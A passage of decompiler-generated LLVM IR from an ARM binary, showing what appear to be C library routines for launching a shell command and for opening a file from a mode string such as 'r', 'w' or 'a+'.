  store i32 %v3_d0cc, i32* %r3.global-to-local, align 4
  %v1_d0d0 = add i32 %v3_d0cc, 4
  %v2_d0d0 = inttoptr i32 %v1_d0d0 to i32*
  %v3_d0d0 = load i32, i32* %v2_d0d0, align 4
  store i32 %v3_d0d0, i32* %r0.global-to-local, align 4
  %v1_d0d4 = call i32 @function_ca18(i32 %v3_d0d0)
  store i32 %v1_d0d4, i32* %r0.global-to-local, align 4
  %v0_d0d8 = load i32, i32* @r4, align 4
  %v1_d0d8 = inttoptr i32 %v0_d0d8 to i32*
  %storemerge = load i32, i32* %v1_d0d8, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_d0dc = icmp eq i32 %storemerge, 0
  br i1 %v2_d0dc, label %dec_label_pc_d0e4, label %dec_label_pc_d0cc

dec_label_pc_d0e4:                                ; preds = %dec_label_pc_d0cc, %dec_label_pc_d0c0
  store i32 %v0_cfa8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_15d0c.296 to i32), i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15d18.300 to i32), i32* %r2.global-to-local, align 4
  %v8_d0f8 = call i32 @function_10594(i32 ptrtoint ([8 x i8]* @global_var_15d0c.296 to i32), i32 ptrtoint ([3 x i8]* @global_var_15d14.298 to i32), i32 ptrtoint ([3 x i8]* @global_var_15d18.300 to i32), i32 %v0_cfa8, i32 0)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_d100 = call i32 @function_10d38(i32 127)
  unreachable

dec_label_pc_d104:                                ; preds = %dec_label_pc_d05c
  store i32 %v2_d068, i32* @r6, align 4
  store i32 %v2_d068, i32* @r0, align 4
  store i32 67648, i32* @r7, align 4
  %v1_d118 = call i32 @function_10840()
  store i32 %v4_d028, i32* %r0.global-to-local, align 4
  %v1_d120 = call i32 @function_ca18(i32 %v4_d028)
  store i32 %v1_d120, i32* %r0.global-to-local, align 4
  %v0_d124 = load i32, i32* @r5, align 4
  %tmp26 = icmp slt i32 %v0_d124, 1
  br i1 %tmp26, label %dec_label_pc_d194, label %dec_label_pc_d12c

dec_label_pc_d12c:                                ; preds = %dec_label_pc_d104
  store i32 %v1_cfe4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f900.283 to i32), i32* %r4.global-to-local, align 4
  %v2_d138 = add i32 %v1_cfe4, 4
  %v3_d138 = inttoptr i32 %v2_d138 to i32*
  store i32 %v7_d038, i32* %v3_d138, align 4
  %v0_d13c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d13c, i32* %r2.global-to-local, align 4
  %v0_d140 = load i32, i32* @r5, align 4
  %v1_d140 = load i32, i32* %r3.global-to-local, align 4
  %v2_d140 = add i32 %v1_d140, 8
  %v3_d140 = inttoptr i32 %v2_d140 to i32*
  store i32 %v0_d140, i32* %v3_d140, align 4
  store i32 %v2_d068, i32* @r0, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  %v1_d154 = call i32 @function_10840()
  %v0_d158 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d158, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  %v1_d164 = call i32 @function_10838()
  store i32 ptrtoint (i32* @global_var_1f918.288 to i32), i32* %r2.global-to-local, align 4
  %v2_d170 = load i32, i32* @global_var_1f918.288, align 4
  %v2_d174 = inttoptr i32 %v1_cfe4 to i32*
  store i32 %v2_d170, i32* %v2_d174, align 4
  store i32 %v1_cfe4, i32* %r3.global-to-local, align 4
  store i32 %v2_d068, i32* @r0, align 4
  %v1_d184 = load i32, i32* %r2.global-to-local, align 4
  %v2_d184 = inttoptr i32 %v1_d184 to i32*
  store i32 %v1_cfe4, i32* %v2_d184, align 4
  %v1_d18c = call i32 @function_10840()
  store i32 %v1_d18c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d1ac

dec_label_pc_d194:                                ; preds = %dec_label_pc_d104
  store i32 %v7_d038, i32* %r0.global-to-local, align 4
  %v1_d198 = inttoptr i32 %v7_d038 to i8*
  %v2_d198 = call i32 @function_cc14(i8* %v1_d198)
  store i32 %v2_d198, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d19c

dec_label_pc_d19c:                                ; preds = %dec_label_pc_cff8, %dec_label_pc_d048, %dec_label_pc_d194
  store i32 %v1_cfe4, i32* %r0.global-to-local, align 4
  %v1_d1a0 = call i32 @function_fa5c(i32 %v1_cfe4)
  store i32 %v1_d1a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d1ac

dec_label_pc_d1ac:                                ; preds = %dec_label_pc_cfe0, %dec_label_pc_d12c, %dec_label_pc_cfc0, %dec_label_pc_d19c
  %stack_var_-64.1 = phi i32 [ 0, %dec_label_pc_cfe0 ], [ 0, %dec_label_pc_d19c ], [ %v7_d038, %dec_label_pc_d12c ], [ 0, %dec_label_pc_cfc0 ]
  store i32 %stack_var_-64.1, i32* %r0.global-to-local, align 4
  %v2_d1b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_d1b4, i32* %r4.global-to-local, align 4
  ret i32 %stack_var_-64.1

; uselistorder directives
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v7_d038, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v4_d028, { 1, 0, 3, 2, 7, 6, 8, 5, 4, 10, 9, 11 }
  uselistorder i32 %v4_d01c, { 1, 0, 3, 2, 6, 5, 4 }
  uselistorder i32 %v1_cfe4, { 6, 5, 1, 0, 2, 4, 3, 7, 8 }
  uselistorder i32 %v0_d0ac, { 1, 4, 3, 0, 2 }
  uselistorder i32 %v0_cfa8, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 6, 5, 9, 7, 0, 8, 11, 10, 12, 14, 13, 16, 15, 17, 19, 18, 31, 1, 20, 22, 21, 23, 32, 24, 25, 33, 26, 28, 27, 30, 29, 2, 3 }
  uselistorder i32* @global_var_1f918.288, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1f918.288 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1f900.283 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_d1ac, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_d19c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d0cc, { 1, 0 }
  uselistorder label %dec_label_pc_d0c0, { 1, 0 }
  uselistorder label %dec_label_pc_cfe0, { 1, 0 }
}

define i32 @function_d1dc(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d1dc:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_d1dc = load i32, i32* @r4, align 4
  store i32 %v3_d1dc, i32* %stack_var_-24, align 4
  %v6_d1dc = load i32, i32* @r5, align 4
  %v9_d1dc = load i32, i32* @r6, align 4
  %v15_d1dc = load i32, i32* @r8, align 4
  %v3_d1e0 = load i8, i8* %arg2, align 1
  %v4_d1e0 = zext i8 %v3_d1e0 to i32
  store i32 %v4_d1e0, i32* @ip, align 4
  %v7_d1e4 = icmp eq i8 %v3_d1e0, 114
  store i1 %v7_d1e4, i1* %cpsr_z.global-to-local, align 1
  %v2_d1e8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r5, align 4
  br i1 %v7_d1e4, label %dec_label_pc_d240, label %dec_label_pc_d1fc

dec_label_pc_d1fc:                                ; preds = %dec_label_pc_d1dc
  %v7_d1fc = icmp eq i8 %v3_d1e0, 119
  store i1 %v7_d1fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d1fc, label %bb, label %dec_label_pc_d208

bb:                                               ; preds = %dec_label_pc_d1fc
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_d244

dec_label_pc_d208:                                ; preds = %dec_label_pc_d1fc
  %v7_d208 = icmp eq i8 %v3_d1e0, 97
  store i1 %v7_d208, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d208, label %bb31, label %dec_label_pc_d214

bb31:                                             ; preds = %dec_label_pc_d208
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_d244

dec_label_pc_d214:                                ; preds = %dec_label_pc_d208, %dec_label_pc_d2cc, %dec_label_pc_d2a0
  %v0_d214 = call i32 @function_cc08()
  store i32 %v0_d214, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_d21c = load i32, i32* @r8, align 4
  %v2_d21c = icmp eq i32 %v0_d21c, 0
  store i1 %v2_d21c, i1* %cpsr_z.global-to-local, align 1
  %v2_d220 = inttoptr i32 %v0_d214 to i32*
  store i32 22, i32* %v2_d220, align 4
  br i1 %v2_d21c, label %dec_label_pc_d494, label %dec_label_pc_d228

dec_label_pc_d228:                                ; preds = %dec_label_pc_d2f0._crit_edge, %dec_label_pc_d214
  %v0_d228 = load i32, i32* @r8, align 4
  %v1_d228 = add i32 %v0_d228, 1
  %v2_d228 = inttoptr i32 %v1_d228 to i8*
  %v3_d228 = load i8, i8* %v2_d228, align 1
  %v4_d228 = zext i8 %v3_d228 to i32
  store i32 %v4_d228, i32* %r3.global-to-local, align 4
  %v1_d22c = and i32 %v4_d228, 32
  %v2_d22c = icmp eq i32 %v1_d22c, 0
  store i1 %v2_d22c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d22c, label %dec_label_pc_d494, label %dec_label_pc_d234

dec_label_pc_d234:                                ; preds = %dec_label_pc_d228
  store i32 %v0_d228, i32* %r0.global-to-local, align 4
  %v2_d238 = call i32 @function_fa5c(i32 %v0_d228)
  store i32 %v2_d238, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d494

dec_label_pc_d240:                                ; preds = %dec_label_pc_d1dc
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_d244

dec_label_pc_d244:                                ; preds = %bb, %bb31, %dec_label_pc_d240
  %v1_d25c = phi i32 [ 1089, %bb31 ], [ 577, %bb ], [ 1, %dec_label_pc_d240 ]
  %v2_d244 = add i32 %tmp, 1
  %v3_d244 = inttoptr i32 %v2_d244 to i8*
  %v4_d244 = load i8, i8* %v3_d244, align 1
  %v7_d248 = icmp eq i8 %v4_d244, 98
  store i1 %v7_d248, i1* %cpsr_z.global-to-local, align 1
  %v2_d244.tmp = select i1 %v7_d248, i32 %v2_d244, i32 %tmp
  store i32 %v2_d244.tmp, i32* %r3.global-to-local, align 4
  %v1_d254 = add i32 %v2_d244.tmp, 1
  %v2_d254 = inttoptr i32 %v1_d254 to i8*
  %v3_d254 = load i8, i8* %v2_d254, align 1
  %v4_d254 = zext i8 %v3_d254 to i32
  store i32 %v4_d254, i32* %r3.global-to-local, align 4
  %v7_d258 = icmp eq i8 %v3_d254, 43
  store i1 %v7_d258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d258, label %bb34, label %.thread4

bb34:                                             ; preds = %dec_label_pc_d244
  store i32 %v1_d25c, i32* %r3.global-to-local, align 4
  %v2_d260 = add nuw nsw i32 %v1_d25c, 1
  store i32 %v2_d260, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_d244, %bb34
  %v2_d264 = icmp eq i32 %arg3, 0
  store i1 %v2_d264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d264, label %dec_label_pc_d26c, label %dec_label_pc_d298

dec_label_pc_d26c:                                ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_d270 = call i32 @function_f908(i32 80)
  store i32 %v1_d270, i32* %r0.global-to-local, align 4
  store i32 %v1_d270, i32* @r8, align 4
  %v3_d274 = icmp eq i32 %v1_d270, 0
  store i1 %v3_d274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d274, label %dec_label_pc_d498, label %dec_label_pc_d27c

dec_label_pc_d27c:                                ; preds = %dec_label_pc_d26c
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_d284 = add i32 %v1_d270, 1
  %v4_d284 = inttoptr i32 %v3_d284 to i8*
  store i8 32, i8* %v4_d284, align 1
  %v0_d288 = load i32, i32* %r2.global-to-local, align 4
  %v1_d288 = load i32, i32* @r8, align 4
  %v2_d288 = add i32 %v1_d288, 8
  %v3_d288 = inttoptr i32 %v2_d288 to i32*
  store i32 %v0_d288, i32* %v3_d288, align 4
  %v0_d28c = load i32, i32* %r2.global-to-local, align 4
  %v1_d28c = trunc i32 %v0_d28c to i8
  %v2_d28c = load i32, i32* @r8, align 4
  %v3_d28c = inttoptr i32 %v2_d28c to i8*
  store i8 %v1_d28c, i8* %v3_d28c, align 1
  %v0_d290 = load i32, i32* @r8, align 4
  %v1_d290 = add i32 %v0_d290, 56
  store i32 %v1_d290, i32* @r0, align 4
  %v0_d294 = call i32 @function_d544()
  store i32 %v0_d294, i32* %r0.global-to-local, align 4
  %v0_d298.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d298

dec_label_pc_d298:                                ; preds = %.thread4, %dec_label_pc_d27c
  %v0_d2f0 = phi i32 [ %arg4, %.thread4 ], [ %v0_d298.pre, %dec_label_pc_d27c ]
  %v1_d298 = icmp slt i32 %v0_d2f0, 0
  %v2_d298 = icmp eq i32 %v0_d2f0, 0
  store i1 %v2_d298, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_d298, label %dec_label_pc_d2f0, label %dec_label_pc_d2a0

dec_label_pc_d2a0:                                ; preds = %dec_label_pc_d298
  %v0_d2a4 = load i32, i32* @r4, align 4
  %v2_d2a4 = and i32 %v0_d2a4, ptrtoint (i32* @global_var_20003.305 to i32)
  %v1_d2a8 = or i32 %v2_d2a4, 1
  store i32 %v1_d2a8, i32* %r2.global-to-local, align 4
  %v0_d2ac = load i32, i32* @r6, align 4
  %v1_d2ac = add i32 %v0_d2ac, 1
  %v2_d2b0 = and i32 %v1_d2ac, %v1_d2a8
  store i32 %v2_d2b0, i32* %r3.global-to-local, align 4
  %v9_d2b4 = icmp eq i32 %v2_d2b0, %v1_d2a8
  store i1 %v9_d2b4, i1* %cpsr_z.global-to-local, align 1
  %v1_d2b8 = load i32, i32* @r8, align 4
  %v2_d2b8 = add i32 %v1_d2b8, 4
  %v3_d2b8 = inttoptr i32 %v2_d2b8 to i32*
  store i32 %v0_d2f0, i32* %v3_d2b8, align 4
  br i1 %v9_d2b4, label %dec_label_pc_d2c0, label %dec_label_pc_d214

dec_label_pc_d2c0:                                ; preds = %dec_label_pc_d2a0
  %v0_d2c0 = load i32, i32* @r4, align 4
  %v1_d2c0 = load i32, i32* @r6, align 4
  %v2_d2c0 = sub i32 -1, %v1_d2c0
  %v3_d2c0 = and i32 %v0_d2c0, %v2_d2c0
  store i32 %v3_d2c0, i32* %r3.global-to-local, align 4
  %v1_d2c4 = and i32 %v3_d2c0, 1024
  %v2_d2c4 = icmp eq i32 %v1_d2c4, 0
  store i1 %v2_d2c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d2c4, label %dec_label_pc_d2e4, label %dec_label_pc_d2cc

dec_label_pc_d2cc:                                ; preds = %dec_label_pc_d2c0
  %v0_d2cc = load i32, i32* @r5, align 4
  store i32 %v0_d2cc, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_d2d8 = call i32 @function_10c48(i32 %v0_d2cc, i32 4)
  store i32 %v2_d2d8, i32* %r0.global-to-local, align 4
  %v2_d2dc = icmp eq i32 %v2_d2d8, 0
  store i1 %v2_d2dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d2dc, label %dec_label_pc_d2cc.dec_label_pc_d2e4_crit_edge, label %dec_label_pc_d214

dec_label_pc_d2cc.dec_label_pc_d2e4_crit_edge:    ; preds = %dec_label_pc_d2cc
  %v0_d2e4.pre = load i32, i32* @r6, align 4
  %v0_d2e8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d2e4

dec_label_pc_d2e4:                                ; preds = %dec_label_pc_d2cc.dec_label_pc_d2e4_crit_edge, %dec_label_pc_d2c0
  %v0_d2e8 = phi i32 [ %v0_d2e8.pre, %dec_label_pc_d2cc.dec_label_pc_d2e4_crit_edge ], [ %v0_d2c0, %dec_label_pc_d2c0 ]
  %v0_d2e4 = phi i32 [ %v0_d2e4.pre, %dec_label_pc_d2cc.dec_label_pc_d2e4_crit_edge ], [ %v1_d2c0, %dec_label_pc_d2c0 ]
  %v1_d2e4 = and i32 %v0_d2e4, 131072
  store i32 %v1_d2e4, i32* %r3.global-to-local, align 4
  %v2_d2e8 = or i32 %v1_d2e4, %v0_d2e8
  store i32 %v2_d2e8, i32* @r4, align 4
  br label %dec_label_pc_d314

dec_label_pc_d2f0:                                ; preds = %dec_label_pc_d298
  %v7_d2f0 = icmp eq i32 %v0_d2f0, -1
  store i1 %v7_d2f0, i1* %cpsr_z.global-to-local, align 1
  %v0_d2fc.pre = load i32, i32* @r4, align 4
  br i1 %v7_d2f0, label %dec_label_pc_d2f0._crit_edge, label %bb35

bb35:                                             ; preds = %dec_label_pc_d2f0
  %v2_d2f4 = or i32 %v0_d2fc.pre, ptrtoint (i32* @global_var_20000.306 to i32)
  store i32 %v2_d2f4, i32* @r4, align 4
  br label %dec_label_pc_d2f0._crit_edge

dec_label_pc_d2f0._crit_edge:                     ; preds = %dec_label_pc_d2f0, %bb35
  %v0_d2fc = phi i32 [ %v2_d2f4, %bb35 ], [ %v0_d2fc.pre, %dec_label_pc_d2f0 ]
  %v0_d2f8 = load i32, i32* @r6, align 4
  store i32 %v0_d2f8, i32* %r0.global-to-local, align 4
  store i32 %v0_d2fc, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_d304 = inttoptr i32 %v0_d2f8 to i8*
  %v3_d304 = call i32 @function_10e94(i8* %v2_d304, i32 %v0_d2fc)
  store i32 %v3_d304, i32* %r0.global-to-local, align 4
  %v1_d308 = icmp slt i32 %v3_d304, 0
  %v2_d308 = icmp eq i32 %v3_d304, 0
  store i1 %v2_d308, i1* %cpsr_z.global-to-local, align 1
  %v1_d30c = load i32, i32* @r8, align 4
  %v2_d30c = add i32 %v1_d30c, 4
  %v3_d30c = inttoptr i32 %v2_d30c to i32*
  store i32 %v3_d304, i32* %v3_d30c, align 4
  br i1 %v1_d308, label %dec_label_pc_d228, label %dec_label_pc_d314

dec_label_pc_d314:                                ; preds = %dec_label_pc_d2f0._crit_edge, %dec_label_pc_d2e4
  %v0_d314 = load i32, i32* @r8, align 4
  %v1_d314 = inttoptr i32 %v0_d314 to i32*
  %v2_d314 = load i32, i32* %v1_d314, align 4
  %v1_d318 = and i32 %v2_d314, 8192
  store i32 %v1_d318, i32* %r3.global-to-local, align 4
  %v3_d31c1 = udiv i32 %v1_d318, 256
  store i32 %v3_d31c1, i32* %r2.global-to-local, align 4
  %v1_d320 = trunc i32 %v3_d31c1 to i8
  %v3_d320 = add i32 %v0_d314, 1
  %v4_d320 = inttoptr i32 %v3_d320 to i8*
  store i8 %v1_d320, i8* %v4_d320, align 1
  %v0_d324 = load i32, i32* %r3.global-to-local, align 4
  %v1_d324 = trunc i32 %v0_d324 to i8
  %v2_d324 = load i32, i32* @r8, align 4
  %v3_d324 = inttoptr i32 %v2_d324 to i8*
  store i8 %v1_d324, i8* %v3_d324, align 1
  %v0_d328 = load i32, i32* @r4, align 4
  %v1_d328 = and i32 %v0_d328, ptrtoint (i32* @global_var_20000.306 to i32)
  store i32 %v1_d328, i32* %r1.global-to-local, align 4
  %v2_d328 = icmp eq i32 %v1_d328, 0
  store i1 %v2_d328, i1* %cpsr_z.global-to-local, align 1
  %v0_d32c = load i32, i32* @r8, align 4
  %v1_d32c = add i32 %v0_d32c, 1
  %v2_d32c = inttoptr i32 %v1_d32c to i8*
  %v3_d32c = load i8, i8* %v2_d32c, align 1
  %v4_d32c = zext i8 %v3_d32c to i32
  %v1_d330 = inttoptr i32 %v0_d32c to i8*
  %v2_d330 = load i8, i8* %v1_d330, align 1
  %v3_d330 = zext i8 %v2_d330 to i32
  store i32 %v3_d330, i32* %r3.global-to-local, align 4
  br i1 %v2_d328, label %bb37, label %bb36

bb36:                                             ; preds = %dec_label_pc_d314
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb37

bb37:                                             ; preds = %dec_label_pc_d314, %bb36
  %v0_d344 = phi i32 [ 0, %dec_label_pc_d314 ], [ 32768, %bb36 ]
  %v1_d338 = and i32 %v0_d328, 1024
  store i32 %v1_d338, i32* %r0.global-to-local, align 4
  %v4_d340 = mul nuw nsw i32 %v4_d32c, 256
  %v5_d340 = or i32 %v3_d330, %v4_d340
  %v2_d344 = or i32 %v0_d344, %v1_d338
  store i32 %v2_d344, i32* %r1.global-to-local, align 4
  %v2_d34c = or i32 %v5_d340, %v2_d344
  %v1_d33c = mul i32 %v0_d328, 16
  %v1_d348 = and i32 %v1_d33c, 48
  %v1_d350 = add nuw nsw i32 %v1_d348, 16
  %v4_d354 = xor i32 %v1_d350, 48
  %v5_d354 = or i32 %v2_d34c, %v4_d354
  store i32 %v5_d354, i32* %r3.global-to-local, align 4
  %v3_d35819 = udiv i32 %v2_d34c, 256
  store i32 %v3_d35819, i32* %r2.global-to-local, align 4
  %v1_d35c = trunc i32 %v3_d35819 to i8
  store i8 %v1_d35c, i8* %v2_d32c, align 1
  %v0_d360 = load i32, i32* %r3.global-to-local, align 4
  %v1_d360 = trunc i32 %v0_d360 to i8
  %v2_d360 = load i32, i32* @r8, align 4
  %v3_d360 = inttoptr i32 %v2_d360 to i8*
  store i8 %v1_d360, i8* %v3_d360, align 1
  %v0_d364 = call i32 @function_cc08()
  store i32 %v0_d364, i32* %r0.global-to-local, align 4
  %v0_d368 = load i32, i32* @r8, align 4
  %v1_d368 = add i32 %v0_d368, 1
  %v2_d368 = inttoptr i32 %v1_d368 to i8*
  %v3_d368 = load i8, i8* %v2_d368, align 1
  %v4_d368 = zext i8 %v3_d368 to i32
  store i32 %v4_d368, i32* @r3, align 4
  %v1_d36c = inttoptr i32 %v0_d368 to i8*
  %v2_d36c = load i8, i8* %v1_d36c, align 1
  %v3_d36c = zext i8 %v2_d36c to i32
  store i32 %v0_d364, i32* @r6, align 4
  %v1_d374 = add i32 %v0_d368, 4
  %v2_d374 = inttoptr i32 %v1_d374 to i32*
  %v3_d374 = load i32, i32* %v2_d374, align 4
  store i32 %v3_d374, i32* @r0, align 4
  %v4_d378 = mul nuw nsw i32 %v4_d368, 256
  %v5_d378 = or i32 %v3_d36c, %v4_d378
  store i32 %v5_d378, i32* @r4, align 4
  %v1_d37c = inttoptr i32 %v0_d364 to i32*
  %v2_d37c = load i32, i32* %v1_d37c, align 4
  store i32 %v2_d37c, i32* @r5, align 4
  %v1_d380 = call i32 @function_f1ac(i32 %v3_d374)
  store i32 %v1_d380, i32* %r0.global-to-local, align 4
  %v0_d384 = load i32, i32* @r4, align 4
  %v4_d384 = mul i32 %v1_d380, 256
  %v5_d384 = or i32 %v0_d384, %v4_d384
  store i32 %v5_d384, i32* @r4, align 4
  %v3_d388 = sdiv i32 %v5_d384, 256
  store i32 %v3_d388, i32* %r3.global-to-local, align 4
  %v1_d38c = trunc i32 %v3_d388 to i8
  %v2_d38c = load i32, i32* @r8, align 4
  %v3_d38c = add i32 %v2_d38c, 1
  %v4_d38c = inttoptr i32 %v3_d38c to i8*
  store i8 %v1_d38c, i8* %v4_d38c, align 1
  %v0_d390 = load i32, i32* @r4, align 4
  %v1_d390 = trunc i32 %v0_d390 to i8
  %v2_d390 = load i32, i32* @r8, align 4
  %v3_d390 = inttoptr i32 %v2_d390 to i8*
  store i8 %v1_d390, i8* %v3_d390, align 1
  %v0_d394 = load i32, i32* @r5, align 4
  %v1_d394 = load i32, i32* @r6, align 4
  %v2_d394 = inttoptr i32 %v1_d394 to i32*
  store i32 %v0_d394, i32* %v2_d394, align 4
  %v0_d398 = load i32, i32* @r8, align 4
  %v1_d398 = add i32 %v0_d398, 8
  %v2_d398 = inttoptr i32 %v1_d398 to i32*
  %v3_d398 = load i32, i32* %v2_d398, align 4
  store i32 %v3_d398, i32* %r3.global-to-local, align 4
  %v2_d39c = icmp eq i32 %v3_d398, 0
  store i1 %v2_d39c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d39c, label %dec_label_pc_d3a4, label %bb38

dec_label_pc_d3a4:                                ; preds = %bb37
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_d3a8 = call i32 @function_f908(i32 4096)
  store i32 %v1_d3a8, i32* %r0.global-to-local, align 4
  %v2_d3ac = icmp eq i32 %v1_d3a8, 0
  store i1 %v2_d3ac, i1* %cpsr_z.global-to-local, align 1
  %v1_d3c0.pre = load i32, i32* @r8, align 4
  br i1 %v2_d3ac, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_d3a4
  %v2_d3c020 = add i32 %v1_d3c0.pre, 8
  %v3_d3c021 = inttoptr i32 %v2_d3c020 to i32*
  store i32 0, i32* %v3_d3c021, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_d3a4
  %v2_d3b0 = inttoptr i32 %v1_d3c0.pre to i32*
  %v3_d3b0 = load i32, i32* %v2_d3b0, align 4
  %v2_d3b4 = or i32 %v3_d3b0, 16384
  store i32 %v2_d3b4, i32* %r3.global-to-local, align 4
  %v2_d3b8 = add i32 %v1_d3a8, 4096
  store i32 %v2_d3b8, i32* %r2.global-to-local, align 4
  %v4_d3bc = sdiv i32 %v2_d3b4, 256
  store i32 %v4_d3bc, i32* %r1.global-to-local, align 4
  %v2_d3c0 = add i32 %v1_d3c0.pre, 8
  %v3_d3c0 = inttoptr i32 %v2_d3c0 to i32*
  store i32 %v1_d3a8, i32* %v3_d3c0, align 4
  %v1_d3c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_d3c4 = load i32, i32* @r8, align 4
  %v3_d3c4 = add i32 %v2_d3c4, 12
  %v4_d3c4 = inttoptr i32 %v3_d3c4 to i32*
  store i32 %v1_d3c4, i32* %v4_d3c4, align 4
  %v1_d3c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_d3c8 = trunc i32 %v1_d3c8 to i8
  %v3_d3c8 = load i32, i32* @r8, align 4
  %v4_d3c8 = add i32 %v3_d3c8, 1
  %v5_d3c8 = inttoptr i32 %v4_d3c8 to i8*
  store i8 %v2_d3c8, i8* %v5_d3c8, align 1
  %v0_d3cc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3cc.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_d3cc = load i32, i32* %r3.global-to-local, align 4
  %v2_d3cc = trunc i32 %v1_d3cc to i8
  %v3_d3cc = load i32, i32* @r8, align 4
  %v4_d3cc = inttoptr i32 %v3_d3cc to i8*
  store i8 %v2_d3cc, i8* %v4_d3cc, align 1
  %v0_d3d0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3d0.pr.pr, label %.thread10, label %bb38

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_d3d0 = load i32, i32* @r8, align 4
  %v3_d3d0 = add i32 %v2_d3d0, 12
  %v4_d3d0 = inttoptr i32 %v3_d3d0 to i32*
  store i32 %v1_d3a8, i32* %v4_d3d0, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f1b8.309 to i32), i32* %r3.global-to-local, align 4
  %v2_d3dc = load i32, i32* @r8, align 4
  %v3_d3dc = add i32 %v2_d3dc, 2
  %v4_d3dc = inttoptr i32 %v3_d3dc to i8*
  store i8 0, i8* %v4_d3dc, align 1
  %v0_d3e0 = load i32, i32* @r8, align 4
  %v1_d3e0 = add i32 %v0_d3e0, 1
  %v2_d3e0 = inttoptr i32 %v1_d3e0 to i8*
  %v3_d3e0 = load i8, i8* %v2_d3e0, align 1
  %v4_d3e0 = zext i8 %v3_d3e0 to i32
  store i32 %v4_d3e0, i32* %r2.global-to-local, align 4
  %v2_d3e4 = load i32, i32* @global_var_1f1b8.309, align 4
  store i32 %v2_d3e4, i32* %r1.global-to-local, align 4
  %v1_d3e8 = add i32 %v0_d3e0, 8
  %v2_d3e8 = inttoptr i32 %v1_d3e8 to i32*
  %v3_d3e8 = load i32, i32* %v2_d3e8, align 4
  store i32 %v3_d3e8, i32* %r3.global-to-local, align 4
  %v1_d3ec = and i32 %v4_d3e0, 32
  %v2_d3ec = icmp eq i32 %v1_d3ec, 0
  store i1 %v2_d3ec, i1* %cpsr_z.global-to-local, align 1
  %v2_d3f0 = add i32 %v0_d3e0, 20
  %v3_d3f0 = inttoptr i32 %v2_d3f0 to i32*
  store i32 %v3_d3e8, i32* %v3_d3f0, align 4
  %v0_d3f4 = load i32, i32* %r0.global-to-local, align 4
